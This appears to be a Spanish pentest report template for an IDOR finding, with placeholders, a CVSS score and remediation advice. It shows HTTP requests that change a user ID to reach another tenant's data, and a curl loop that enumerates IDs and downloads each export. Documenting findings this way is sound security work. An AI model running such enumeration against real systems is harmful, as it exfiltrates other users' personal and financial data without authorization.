# Insecure Direct Object Reference (CWE-639) - {{Crítica | Alta}}

| Campo | Valor |
|---|---|
| **CVSS Vector** | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| **CVSS Score** | `{{8.7}}` |
| **CWE** | [CWE-639 – Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html) |
| **OWASP** | A01:2021 – Broken Access Control / API1:2023 – BOLA |
| **Estado** | {{Abierto}} |

## Descripción

Una referencia directa insegura a objetos (IDOR) ocurre cuando la aplicación expone un
identificador interno (ID numérico, UUID, nombre de archivo, token) y lo utiliza para
acceder a un recurso **sin verificar que el usuario autenticado esté autorizado** sobre
ese objeto en particular. Un atacante puede modificar el identificador en la petición
para leer, modificar o eliminar datos de otros usuarios o tenants (acceso horizontal o
cross-tenant), incluso cuando la autenticación es correcta.

## Componentes Afectados

- `{{https://app.cliente.com/api/v1/users/{id}}}`
- **Parámetros:** `{{id}}`, `{{client}}`, `{{tenant_id}}`

## Detalles

Se identificó que el endpoint `{{/recurso/{id}}}` permite acceder a recursos de otros
usuarios/empresas modificando el identificador, sin validación de pertenencia del lado
del servidor.

**Paso 1 — Petición legítima con el ID propio (`{{id=623}}`)**

```http
GET /api/v1/users/623/export HTTP/1.1
Host: app.cliente.com
Authorization: Bearer {{TOKEN_USUARIO_A}}
```

```http
HTTP/1.1 200 OK
Content-Length: 3965

{{datos del usuario propio}}
```

**Paso 2 — Se modifica el identificador a un recurso ajeno (`{{id=9}}`)**

```http
GET /api/v1/users/9/export HTTP/1.1
Host: app.cliente.com
Authorization: Bearer {{TOKEN_USUARIO_A}}
```

```http
HTTP/1.1 200 OK
Content-Length: 789315

{{datos de OTRO tenant/usuario — acceso no autorizado confirmado}}
```

> _Figura {{N}}: respuesta del servidor entregando datos del tenant ajeno (`id=9`)._

**Paso 3 — (Opcional) Enumeración masiva con Burp Intruder / curl**

```bash
for id in $(seq 1 1000); do
  curl -s -H "Authorization: Bearer {{TOKEN}}" \
    "https://app.cliente.com/api/v1/users/$id/export" -o "out_$id.json"
done
```

> _Figura {{N+1}}: enumeración secuencial de IDs y exfiltración de registros de múltiples tenants._

## Impacto

Un atacante autenticado puede acceder y exfiltrar información de **cualquier otro
usuario o empresa** de la plataforma (PII, datos financieros, documentos), e
incluso modificarla o eliminarla si el endpoint lo permite. En un entorno multi-tenant
esto rompe el aislamiento entre clientes y puede derivar en fuga masiva de datos e
incumplimiento de PCI DSS / protección de datos.

## Remediación

- Validar **del lado del servidor** que el objeto solicitado pertenece al usuario/tenant
  autenticado en **cada** petición (autorización a nivel de objeto).
- Sustituir identificadores secuenciales predecibles por valores no adivinables (UUIDv4)
  — como defensa en profundidad, no como control único.
- Implementar un modelo de control de acceso centralizado (RBAC/ABAC) y pruebas
  automáticas de autorización por endpoint.
- Registrar y alertar sobre accesos anómalos / enumeración de identificadores.

## Referencias

- https://cwe.mitre.org/data/definitions/639.html
- https://owasp.org/Top10/A01_2021-Broken_Access_Control/
- https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html
